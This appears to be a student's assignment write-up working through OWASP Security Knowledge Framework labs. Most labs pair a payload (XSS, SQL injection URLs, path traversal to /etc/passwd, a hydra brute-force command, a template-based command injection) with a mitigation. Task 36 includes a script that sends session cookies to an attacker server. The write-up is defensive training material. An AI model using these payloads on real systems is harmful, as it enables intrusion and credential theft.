## What we will do: 

In this assignment, you will get familiar with the common security issues on the web and how they are performed. The OWASP community provides a number of exercises that demonstrate such issues in their Security Knowledge Framework. Labs: 

https://demo.securityknowledgeframework.org/labs/view
Sources: https://github.com/blabla1337/skf-labs

Follow mini-labs provided by Security Knowledge Framework. You can launch labs
in the cloud or in your local environment from sources.



## Task 1: Cross site scripting

Cross-Site Scripting (XSS) attacks are a type of injection, in which malicious scripts are injected into otherwise benign and trusted websites. XSS attacks occur when an attacker uses a web application to send malicious code, generally in the form of a browser side script, to a different end user.



### Implementation:

This one was a simple one.
I only tried this simple script and successfully worked.

```
<b onmouseover=alert('Wufff!')>click me!</b>
```

![](https://i.imgur.com/GaWHFAk.png)



Lets look into the code (I will look through the python codes):

The user's input is sent to the /home address using post request.
Then in /home, using render_template, send the exact input to the index.html. In index.html, the value is shown to us.



![](https://i.imgur.com/8GI1gjI.png)
    
![](https://i.imgur.com/9YLmwz8.png)

![](https://i.imgur.com/fnBf4A9.png)



autoescape is a security feature of flask that would automatically convert the characters &, <, >, ‘, and ” in string s to HTML-safe sequences. But, it is disabled here. As a result, I tried to remove this part (I guess for this part it is enough)

As a result when I tried the previous input:


    
![](https://i.imgur.com/y5A1Zqh.png)





## Task 2: Cross site scripting (attribute)


This is a type of XSS that trys to inject the script in tag's attribute



### Implementation:

First see what happens when we right "red" as the input. In the response we can see that the exact "red" is writen in style attribute.


![](https://i.imgur.com/oTtBcod.png)


See if it has any security assumptions for the user input or not:

I tried "red'>" as the input and it seems like it does not omit special characters.


![](https://i.imgur.com/rvUqhOE.png)
    
![](https://i.imgur.com/hUDXeXq.png)
    

So, I tried with the following input:

```
red>;'><script>alert("Hiiieee")</script>
```

![](https://i.imgur.com/BVtEyI7.png)

![](https://i.imgur.com/Q5nWEcd.png)




I went through code and again autoescape was disabled so, I removed it and played it again.


![](https://i.imgur.com/qIBsy1c.png)
    
![](https://i.imgur.com/NKpAGPR.png)
    


## Task 3: Cross site scripting (href)

In an A tag, you can call JavaScript through the HREF portion of the tag



### Implementation:

What we write, will be placed in "href" attribute:


![](https://i.imgur.com/9UgyeRG.png)


I tried the following input:

```
javascript:alert('XSS')
```
Then when I clicked the link, the alert was shown.

    
![](https://i.imgur.com/gSY9iEy.png)
    
![](https://i.imgur.com/pk1wmmr.png)


Based on the flask documentation:

> There is one class of XSS issues that Jinja’s escaping does not protect against. The a tag’s href attribute can contain a javascript: URI, which the browser will execute when clicked if not secured properly.

So, we should use CSP or Content Security Policy response header. I add the following part in the code and as result the script does not trigger anymore.


![](https://i.imgur.com/uF64QQM.png)
    

## Task 4: CSS Injection

A CSS Injection vulnerability involves the ability to inject arbitrary CSS code in the context of a trusted web site which is rendered inside a victim’s browser. The impact of this type of vulnerability varies based on the supplied CSS payload. It may lead to cross site scripting or data exfiltration.



### Implementation:

Input string:

```
blue;}</style> <script>alert("CCSI")</script>
```

    
![](https://i.imgur.com/6azCsIq.png)



I again enabled CSP and everything worked fine.

    
![](https://i.imgur.com/C4M7DnI.png)

![](https://i.imgur.com/82iJb57.png)





## Task 6: Cross site request forgery

Cross-Site Request Forgery (CSRF) is a type of attack that occurs when a malicious web site, email, blog, instant message, or program causes a user's web browser to perform an unwanted action on a trusted site when the user is authenticated. A CSRF attack works because browser requests automatically include all cookies including session cookies. Therefore, if the user is authenticated to the site, the site cannot distinguish between legitimate authorized requests and forged authenticated requests. 



### Implementation:

The scenario is that first user login to the system (username: admin pass:admin). Then set her favorit color. This site will save this color in her cookie. 

Attacker in this place will create a post request to edit this color. For this, it will create a server (using flask in this example) and a compromised html file that will automatically create a post request to edit the color user specified.

Then, this new color will be in the user's cookie and if she refresh the page can see the attackers color.


![](https://i.imgur.com/lOMSuJu.png)
User's favorit color
    
![](https://i.imgur.com/duBUU92.png)
After attacker run his code
    
![](https://i.imgur.com/LQZyhqG.png)
Attacker's code


To mitigate this I will use csrf token provided by flask:

```
In the server code:

from flask_wtf.csrf import CSRFProtect
csrf = CSRFProtect(app)

Add this in each "form" element we have:

<input type="hidden" name="csrf_token" value="{{ csrf_token() }}">
```

CSRF tokens prevent CSRF because without token, attacker cannot create a valid requests to the backend server.


## Task 7: Cross site request forgery (same site)

SameSite prevents the browser from sending this cookie along with cross-site requests. The main goal is to mitigate the risk of cross-origin information leakage. It also provides some protection against cross-site request forgery attacks. Possible values for the flag are none, lax, or strict.

Lax:
Cookies are not sent on normal cross-site subrequests (for example to load images or frames into a third party site), but are sent when a user is navigating to the origin site (i.e., when following a link).

Strict:
Cookies will only be sent in a first-party context and not be sent along with requests initiated by third party websites.

None:
Cookies will be sent in all contexts, i.e. in responses to both first-party and cross-origin requests.



### Implementation:



## Task 8: Cross site request forgery weak

Synchronizer token defenses have been built into many frameworks. It is strongly recommended to research if the framework you are using has an option to achieve CSRF protection by default before trying to build your custom token generating system.



### Implementation:

As we can see it sends a CSRF token along side the request. It is base64, as a result we can decode it. It seems like the token it username and time.


![](https://i.imgur.com/3WBhFpK.png)
![](https://i.imgur.com/3wPZAYz.png)
    

So, we can change our malicious code in a way that create this token and send it alongside the post request.


![](https://i.imgur.com/bdklhH5.png)
    
![](https://i.imgur.com/4PpEO5i.png)
    
![](https://i.imgur.com/rYrMiDG.png)    

I think if I only use the csrf-token created by flask which is enough long and random, we can protect it.


![](https://i.imgur.com/sIpI2Rv.png)



## Task 9: Clickjacking

Clickjacking is an attack that tricks a user into clicking a webpage element which is invisible or disguised as another element. This can cause users to unwittingly download malware, visit malicious web pages, provide credentials or sensitive information, transfer money, or purchase products online.

Typically, clickjacking is performed by displaying an invisible page or HTML element, inside an iframe, on top of the page the user sees. The user believes they are clicking the visible page but in fact they are clicking an invisible element in the additional page transposed on top of it.



### Implementation:

As you can see there is an iframe here that if we click, will send request to the attacker site and try to open facebook.


![](https://i.imgur.com/SHN62Ot.png)
    
![](https://i.imgur.com/KGomd8g.png)



To prevent this attack there is 2 options:

**Client-side methods** – the most common is called Frame Busting. Client-side methods can be effective in some cases, but are considered not to be a best practice, because they can be easily bypassed.

**Server-side methods** – the most common is X-Frame-Options. Server-side methods are recommended by security experts as an effective way to defend against clickjacking.


I will add X-Frame-Option:

```
@app.after_request
def apply_caching(response):
    response.headers["X-Frame-Options"] = "DENY"
    return response
```


## Task 10: Content security policy

The main use of the content security policy header is to, detect, report, and reject XSS attacks. The core issue in relation to XSS attacks is the browser's inability to distinguish between a script that's intended to be part of your application, and a script that's been maliciously injected by a third-party. With the use of CSP(Content Security policy), we can tell the browser which script is safe to execute and which scripts are most likely been injected by an attacker.



### Implementation:

This one only shows how without CSP we cannot stop XSS and then after that, it scripts cannot be run in as XSS attack.

There is nothing to exploit ot give mitigation suggestion I guess.
I used this feature before in other labs.




## Task 12: Path traversal (LFI)

Local File Inclusion (also known as LFI) is the process of including files, that are already locally present on the server, through the exploiting of vulnerable inclusion procedures implemented in the application. This vulnerability occurs, for example, when a page receives, as input, the path to the file that has to be included and this input is not properly sanitized, allowing directory traversal characters (such as dot-dot-slash) to be injected.



### Implementation:

I simply sent the "/etc/passwd" address as the filename


![](https://i.imgur.com/r4C7ybL.png)
    

The problem is here that it tries to open without any sanitization on the filename:


![](https://i.imgur.com/0b92gYP.png)


We should validate the user input and then the application should append the input to the base directory and use a platform filesystem API to canonicalize the path. It should verify that the canonicalized path starts with the expected base directory.



## Task 13: Local file inclusion (hard)

Harder version of pervious one.



### Implementation:

So, I changed the payload like this:

/..././..././..././..././..././..././..././..././etc/passwd

Then when server omit the "../", /../../ sequence will appear.


![](https://i.imgur.com/q5Ra6MU.png)
    
![](https://i.imgur.com/lWkxAfE.png)
Problematic code




I was searching about how to mitigate this and I found we can do such a thing:

Suppose that our contetns are all located in "safe-dir":


```
safe_dir = '/home/saya/server/content/'

if os.path.commonprefix ((os.path.realpath(requested_path),safe_dir)) != safe_dir: 
    #Bad user!

```



## Task 14: Local file inclusion (harder)

Again harder version



### Implementation:

For this one, use double decode url for decodeing the path.



![](https://i.imgur.com/GoYsgMZ.png)

![](https://i.imgur.com/bWyeEXf.png)
    

This part

```
urllib.parse.unquote(filename)
```
will decode the filename we sent. The URL parsing functions focus on splitting a URL string into its components, or on combining URL components into a URL string.

Actually I don't understand why they used this style for attack prevention. But, I think maybe at the begining of the code we can check if it is decoded or not. Or, at the end of these all parse.unquote() we can check if it has ../ or not.


## Task 15: Open redirect

Unvalidated redirects and forwards are possible when a web application accepts untrusted input that could cause the web application to redirect the request to a URL contained within untrusted input. By modifying untrusted URL input to a malicious site, an attacker may successfully launch a phishing scam and steal user credentials.


### Implementation:

I simply edit the address:


![](https://i.imgur.com/X0kIWax.png)



And successfully, google opened.

This problem happened bacause no one checked the user input.



![](https://i.imgur.com/OCzwQuI.png)


So, first of all we can prevent this happening by sanitize input by creating a list of trusted URLs (lists of hosts or a regex).
seconde: Force all redirects to first go through a page notifying users that they are going off of your site, with the destination clearly displayed, and have them click a link to confirm.

Suggestion to use such a mechanism:

```
from flask import request, g, redirect
from urllib.parse import urlparse, urljoin

def is_safe_redirect_url(target):
    host_url = urlparse(request.host_url)
    redirect_url = urlparse(urljoin(request.host_url, target))
    return (
        redirect_url.scheme in ("http", "https")
        and host_url.netloc == redirect_url.netloc
    )


def get_safe_redirect(url):

    if url and is_safe_redirect_url(url):
        return url

    url = request.referrer
    if url and is_safe_redirect_url(url):
        return url

    return "/"

```


## Task 16: Open redirect ( hard )

Harder version of pervious one



### Implementation:

We can exploit it with a more tricky input:

```
https://google%252ecom
```

%25 is equal to "%" after decoding, then we will have "https://google%2ecom" which is encoded version of "https://google.com"

And it will successfully work.
The problem is that in the code it would use black listing and inside it, it would only check if there is dot or not.



![](https://i.imgur.com/WFepjXE.png)


I guess they should try to specifically use white-lists instead of black-lists. Otherwise try to decode the url and then check for it.

## Task 17: Insecure file upload

Uploaded files represent a significant risk to applications. The first step in many attacks is to get some code to the system to be attacked. Then the attack only needs to find a way to get the code executed. Using a file upload helps the attacker accomplish the first step.

There are really three classes of problems here. The first is with the file metadata, like the path and file name. These are generally provided by the transport, such as HTTP multi-part encoding. This data may trick the application into overwriting a critical file or storing the file in a bad location. You must validate the metadata extremely carefully before using it.
The second one is the problem with the file size or content where the attacker can upload a huge 5gig file and creating a DoS. Also an attacker can easily craft a valid image file with PHP code inside that can be ecxecuted when the file is uploaded inside the website root folder.



### Implementation:

Exploit:


    
![](https://i.imgur.com/5YaNRfU.png)


And we can see the uploaded file in the directory:



![](https://i.imgur.com/IRL9lYh.png)


The problem is that it only check the extention not the name of the uploaded file.



![](https://i.imgur.com/ZRdOZOG.png)


so, it this case we can : 
1. Change the filename to something generated by the application
2. Set a filename length limit. Restrict the allowed characters if possible
3. Sanitize the name, ..



## Task 18: Remote file inclusion

In an LFI attack, threat actors use a local file that is stored on the target server to execute a malicious script. These types of attacks can be carried out by using only a web browser. In an RFI attack, they use a file from an external source.



### Implementation:


First lets run the local server and write the "os.popen('whoami').read()" to be executed.
The other option would be using "pastebin.com"

Then I gave the address of the file on local server as the input file name to the website. Successfully exploited.


![](https://i.imgur.com/ulh7IJ1.png)


Actually the problem is here that the programmer is running the string that was from the malicious site.


![](https://i.imgur.com/dWAX8cF.png)


From owasp:
> The most effective solution to eliminate file inclusion vulnerabilities is to avoid passing user-submitted input to any filesystem/framework API. If this is not possible the application can maintain an allow list of files, that may be included by the page, and then use an identifier (for example the index number) to access to the selected file. Any request containing an invalid identifier has to be rejected, in this way there is no attack surface for malicious users to manipulate the path.


## Task 19: SQLI (union select)

Using Union operator to gain information



### Implementation:

We can exploite with:

```
http://localhost:5000/home/1%20union%20select%201,username,password%20from%20users
```


![](https://i.imgur.com/BJ68sej.png)



The problem is that there is no sanitization on the input for the sqli quary.



![](https://i.imgur.com/7qiMf5s.png)

![](https://i.imgur.com/calVcJx.png)


What can we do?
Input validation, sanitization, white list operators and a common way of writing which stop sql injections:

```
cur = db.execute('SELECT pageId, title, content FROM pages WHERE pageId=?', (pageId,))
```

## Task 20: SQLI - like

Use the "like" operator.


### Implementation:

Injection complete using:


```
http://localhost:5000/home/Admin' Union select username,password from users where username like 'A%' -- -
```



![](https://i.imgur.com/SwN0j7z.png)


This happend because of same issue as pervious one:



![](https://i.imgur.com/QJ7dtA6.png)



I think same solutions can work for this one too.




## Task 21: SQLI - blind

Blind SQL (Structured Query Language) injection is a type of SQL Injection attack that asks the database true or false questions and determines the answer based on the applications response.

When the database does not output data to the web page, an attacker is forced to steal data by asking the database a series of true or false questions. This makes exploiting the SQL Injection vulnerability more difficult, but not impossible. .



### Implementation:

We should constantly ask to see if it returns true or false.
Some of the quaries are here:


```
http://localhost:5000/home/(select%20case%20when%20substr(UserName,1,1)='A'%20then%201%20else%204%20end%20from%20users%20limit%200,1)
http://localhost:5000/home/(select%20case%20when%20substr(UserName,2,1)='d'%20then%201%20else%204%20end%20from%20users%20limit%200,1)
http://localhost:5000/home/(select%20case%20when%20substr(UserName,3,1)='m'%20then%201%20else%204%20end%20from%20users%20limit%200,1)
http://localhost:5000/home/(select%20case%20when%20substr(UserName,4,1)='i'%20then%201%20else%204%20end%20from%20users%20limit%200,1)
http://localhost:5000/home/(select%20case%20when%20substr(UserName,5,1)='n'%20then%201%20else%204%20end%20from%20users%20limit%200,1)

```

Caused based on the same problem:


![](https://i.imgur.com/A1jp00Z.png)




## Task 22: Insecure direct object reference


Insecure Direct Object References occur when an application provides direct access to objects based on user-supplied input. As a result of this vulnerability attackers can bypass authorization and access resources in the system directly, for example database records or files.

IDOR do not bring a direct security issue because, by itself, it reveals only the format/pattern used for the object identifier. IDOR bring, depending on the format/pattern in place, a capacity for the attacker to mount a enumeration attack in order to try to probe access to the associated objects.

Enumeration attack can be described in the way in which the attacker build a collection of valid identifiers using the discovered format/pattern and test them against the application.



### Implementation:

For this one I used burpsuit intuder section to bruteforce the id of the pdf.

The size of one of them was different in the begining of the process and I tried it and it was successfull.


![](https://i.imgur.com/Yf5Un1O.png)

![](https://i.imgur.com/vIEHw3L.png)
    



How to solve?
Owasp says:

> The proposal use a hash to replace the direct identifier. This hash is salted with a value defined at application level in order support topology in which the application is deployed in multi-instances mode (case for production).


## Task 23: Right to left override attack



A right-to-left override (RTLO) attack takes advantage of user trust in text files and changes the text file extension to an “.exe” executable file. An RTLO attack is a sophisticated phishing method that tricks users into thinking that they are opening a harmless text file, but they instead open a malicious executable. It’s one of many ways ransomware authors get their malware installed on corporate computers.


### Implementation:

We should use U+202E special characters that is known for operating system and we will use this feature to create malicious files look harmless.

for example:

```
mytext[U+202e]file.txt
```

would become

```
mytexttxt.elif
```



![](https://i.imgur.com/Z0LR0Xg.png)



Now when a user clicks the link to download a mp4 file he will actually download a potentially malicous executable.

Based on attack.miter.org:

> This type of attack technique cannot be easily mitigated with preventive controls since it is based on the abuse of system features.
> Detection methods should include looking for common formats of RTLO characters within filenames such as \u202E, [U+202E], and %E2%80%AE. Defenders should also check their analysis tools to ensure they do not interpret the RTLO character and instead print the true name of the file containing it.



## Task 24: Rate-limiting


Rate limiting for APIs helps protect against malicious bot attacks as well. An attacker can use bots to make so many repeated calls to an API that it renders the service unavailable for anyone else, or crashes the service altogether. This is a type of DoS or DDoS attack.




### Implementation:

First check the source:


![](https://i.imgur.com/XnASFXM.png)



decode this value:

```
Developer username: devteam
Client: Rockyou

```

Lets bruteforce with Rockyou "wordlist" and username "devteam":

```
hydra -l devteam -P ~/Downloads/rockyou.txt/rockyou.txt 127.0.0.1  http-post-form "/:username=^USER^&password=^PASS^:F=Invalid" -s 5000
```

the password is: "manchesterunited"


I am not sure but I guess we should do the following for mitigating DOS base on limiting the rate:

> - Define a minimum ingress data rate limit, and drop all connections below that rate. Note that if the rate limit is set too low, this could impact clients. Inspect the logs to establish a baseline of genuine traffic rate. (Protection against slow HTTP attacks)
> - Define an absolute connection timeout
> - Define a maximum ingress data rate limit, and drop all connections above that rate.
> - Define a total bandwidth size limit to prevent bandwidth exhaustion
> - Define a load limit, which specifies the number of users allowed to access any given resource at any given time.

## Task 25: Regex Ddos


The Regular expression Denial of Service (ReDoS) is a Denial of Service attack, that exploits the fact that most Regular Expression implementations may reach extreme situations that cause them to work very slowly (exponentially related to input size). An attacker can then cause a program using a Regular Expression (Regex) to enter these extreme situations and then hang for a very long time.

The attacker might use the above knowledge to look for applications that use Regular Expressions, containing an Evil Regex, and send a well-crafted input, that will hang the system. Alternatively, if a Regex itself is affected by a user input, the attacker can inject an Evil Regex, and make the system vulnerable.



### Implementation:

lets send a real long string "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa". We can see that app will crash. Before doing this, I tried with different length of input and I observed that by increasing the input size, the response time will increase too.


![](https://i.imgur.com/YFtYmQv.png)




I changed the regex to : 

```
r"^[a-zA-Z0-9_.+-]+@[a-zA-Z0-9-]+\.[a-zA-Z0-9-.]+$"
```

And with large inputs it does not hang anymore.
Also from the sites information:

- We should reduce the number of combinations
    - Avoid using nested quantifiers — e.g., (a+)*
    - Avoid ORs with overlapping clauses — e.g., (b|b)*

- Control backtracking

and some other solutions.

## Task 26: Command injection


The command injecion is an attack in which the goal is execution of arbitrary commands on the host operating system via a vulnerable application. Command injection attacks are possible when an application passes unsafe user supplied data (forms, cookies, HTTP headers etc.) to a system shell. In the first step, the attacker needs to inspect the functioning of the web app in order to find possible injection points. 



### Implementation:

We should create a command and add the result of it to the main page.
So, I used the folowing command and it was successfull (the last # was for commenting out the % that server added after the value)


![](https://i.imgur.com/N7HEB6c.png)



This problem happened because of using input variable without any check on it and pass it to the os.system() function that would directly run the command on the system.


![](https://i.imgur.com/iSQx7b3.png)



How to mitigate?
For this case I think they could explicitly check if the input value is equal to 150 or 50. Having white list of the inputs will help. On the other hand they could check if there is any "/,\,.." or other os commands attributes in it or not.

- Applications should run using the lowest privileges that are required to accomplish the necessary tasks.
- Escape values added to OS commands specific to each OS

## Task 27: Command injection ( easy )

A level harder than the previous one



### Implementation:

So, cause it would print what user inserted as a name, in part of the string on the page, I used the command below and done.


![](https://i.imgur.com/Sahgi6H.png)


Owasp also provid another solution for this problem by using "shlex.quote()"

This return a shell-escaped version of the string s. The returned value is a string that can safely be used as one token in a shell command line, for cases where you cannot use a list.


## Task 28: Command injection ( harder )

Harder version



### Implementation:

This one was really cool. First we created a file with modified html inside it that would run a command and print the /etc/passwd file for us. Then we will upload the file and modifie the name of it to "../templates/index.html" then our modified file would replace the original file and successfully run through the server.


![](https://i.imgur.com/o2pdYJf.png)    


```
<div class="panel panel-primary">
    <div class="panel-heading">
     Monitoring website files system_call('cat /etc/passwd')
     </div>
        <div class="panel-body">
        <pre>{{system_call('cat /etc/passwd')}}</pre>
         </div>
         <div class="panel-footer">
         Hacking challenges
         </div>
         </div>
```

The same issue is applied here.
The input checking is not precies and should carefully managed.

## Task 29: Information disclosure 1

It is very common, and even recommended, for programmers to include detailed comments and metadata on their source code. However, comments and metadata included into the HTML code might reveal internal information that should not be available to potential attackers. Comments and metadata review should be done in order to determine if any information is being leaked.



### Implementation:

Lest look at source code:


![](https://i.imgur.com/cSd1EL2.png)



As you see, the username and password is written there.



![](https://i.imgur.com/OMMBiFx.png)



Solution:
We should reviwe the code not to forget anything.

## Task 30: Information disclosure 2

This one with metadata


### Implementation:


Again looking through source code:




![](https://i.imgur.com/08rEOm3.png)

![](https://i.imgur.com/gRARmkp.png)
    


Mitigation:
Don't right information there.

## Task 31: Authentication bypass ( easy )

This refers to an attacker gaining access equivalent to an authenticated user without ever going through an authentication procedure. This is usually the result of the attacker using an unexpected access procedure that does not go through the proper checkpoints where authentication should occur.



### Implementation:

First login using "admin:admin".
We can see "userid" cookie in our storage.
lets change the value to "2" and see if they are using cookies to authenticate or not.



![](https://i.imgur.com/k1CA6k4.png)

![](https://i.imgur.com/uTW6n4y.png)
    


Yes they did.

Solution?
They should not use cookie based authentication. More secure way is needed (At least they could use JWT token)

## Task 32: Authentication bypass

Bypass using session value



### Implementation:

This one use a week secret key. we can create a malicious server and page with the same secret key in the confing and retrive the new session value and put it in the browser and see what will happen.



![](https://i.imgur.com/XkQUjSV.png)

![](https://i.imgur.com/gxLnVlK.png)
    
    
![](https://i.imgur.com/oqY4lG3.png)

    


Honestly I didn't understand this one and only followed the owasp write-up .. so, I don't know what exactly the problem is or how they got the secret-key value in the first place.


## Task 33: Authentication bypass ( harder )

Something about session id



### Implementation:

After creating a user and logging in, we see that session-value remains same each time logging in. That session value is SHA-1 and then we can try hashing "admin" with SHA-1 and put the value in the session value.



![](https://i.imgur.com/F0T5Odp.png)

![](https://i.imgur.com/biusdgr.png)
    





## Task 35: Authentication bypass

I guess we had it before (No 32)



### Implementation:



## Task 36: HttpOnly (session hijacking)

The attacker can compromise the session token by using malicious code or programs running at the client-side. The example shows how the attacker could use an XSS attack to steal the session token.
Because the server keeps track of the current authenticated user by means of the value of the session cookie, whenever this session cookie gets compromised an attacker is able to impersonate this user by changing his current session cookie with the compromised session cookie in his browsers session storage.



### Implementation:

First I tried "admin:admin" and could login. Then there was a text box and I tried to make XSS.



![](https://i.imgur.com/8SV4hvp.png)
    



It has XSS vulnerability.
Then I looked through the session info:



![](https://i.imgur.com/fs074o3.png)



Because HttpOnly is not false, it doesn't prevent client-side scripts from accessing data. So:



![](https://i.imgur.com/kGG7d7v.png)



Lets start a server and create a script that will send the session cookie to our malicious server:

```
<script>new Image().src="http://localhost:1337/?stolen_cookie="+document.cookie;</script>
```



![](https://i.imgur.com/XMfW6mW.png)
    

And done. Attacker can use this value as his cookie and impersonate the real user.

I think if the HttpOnly value turn to true, this can mitigated.
Also, they should do something for their XSS vulnerability.
